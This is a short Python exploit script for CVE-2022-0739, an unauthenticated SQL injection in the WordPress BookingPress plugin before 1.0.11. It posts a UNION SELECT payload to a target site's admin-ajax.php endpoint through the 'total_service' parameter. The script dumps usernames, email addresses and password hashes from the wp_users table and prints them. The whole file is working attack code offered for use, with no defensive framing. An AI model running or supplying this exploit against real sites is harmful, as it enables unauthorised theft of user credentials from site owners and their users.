import argparse
import requests

class SQL_Injection():
    def __init__(self,url,wpnonce):
        self.url = url + "/wp-admin/admin-ajax.php"
        self.wpnonce = wpnonce
        self.payload = self.sqlinjection()
        self.extract()

    def sqlinjection(self):
        post_data = {
                "action":"bookingpress_front_get_category_services",
                "_wpnonce":self.wpnonce,
                "category_id":"33",
                "total_service":"-7502) UNION SELECT user_login,user_email,user_pass,4,5,6,7,8,9 from wp_users-- -"
        }
        payload = requests.post(self.url, data=post_data)
        return payload.text
    
    def extract(self):
        print("\nCredentials are:")
        print("-"*50)
        prep_list = self.payload.replace('[{"','').replace('"},{"','":"').replace('","','":"').replace('"}]','')
        generate_list = prep_list.split('":"')
        for each_entry in range(0,len(generate_list)):
            if generate_list[each_entry] == "bookingpress_service_id":
                print("Username:",generate_list[each_entry+1])
            if generate_list[each_entry] == "bookingpress_category_id":
                print("Email:",generate_list[each_entry+1])
            if generate_list[each_entry] == "bookingpress_service_name":
                print("Password:",generate_list[each_entry+1])
                print("-"*50)

if __name__=="__main__":
    parser = argparse.ArgumentParser(description="CVE-2022-0739 Wordpress BookingPress Plugin < 1.0.11 Unauthenticated SQL Injection")
    print("CVE-2022-0739 WordPress BookingPress Plugin< 1.0.11 Unauthenticated SQL Injection")
    parser.add_argument("-u",metavar="URL", help="Example: -u http://wordress.site/", required=True)
    parser.add_argument("-p",metavar="WP Nonce", help="Example: -p 1a23b45c67d8", required=True) 
    args = parser.parse_args()

    try:
        SQL_Injection(args.u,args.p)
    except KeyboardInterrupt:
        print("\nBye Bye!")
        exit()